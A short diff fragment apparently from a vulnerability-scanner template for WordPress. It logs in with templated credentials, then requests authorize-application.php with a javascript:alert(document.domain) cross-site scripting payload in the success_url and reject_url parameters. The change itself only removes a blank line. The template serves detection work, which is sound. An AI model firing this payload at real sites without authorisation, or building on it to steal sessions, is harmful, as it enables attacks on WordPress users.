@@ -45,7 +45,6 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
-
       - |
         GET /wp-admin/authorize-application.php?success_url=javascript%3Aalert%28document.domain%29&reject_url=javascript%3Aalert%28document.domain%29 HTTP/1.1
         Host: {{Hostname}}
